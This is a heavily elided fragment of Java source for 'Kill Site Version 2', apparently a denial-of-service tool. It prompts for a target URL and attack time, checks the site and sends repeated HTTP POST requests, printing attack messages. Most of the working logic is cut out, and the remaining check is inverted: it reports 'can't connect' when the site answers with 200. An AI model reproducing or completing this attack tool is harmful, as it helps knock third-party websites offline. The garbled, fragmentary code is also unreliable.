...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.println("Kill Site Version 2 processing...: " + url );
        ...
        System.out.println("Kill Site V2 by DinhTu Yeu Em O Moi Vu Tru");

        System.out.print("!WAIT KILL SITE VERSION 2 FOR STARTING ATTACK!(PLEASE ENTER TIME):  ");
        ...
        System.out.println("Kill Site Version 2 starting attack");
    ...
    private void checkConnection(String url) throws Exception {
        ...
        if (responseCode == 200) {
            System.out.println("Kill Site Version 2 can't connect to website");
        }
        Dos.url = url;
    }
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("KILL SITE VERSION 2 ATTACK SEND!!");
    }
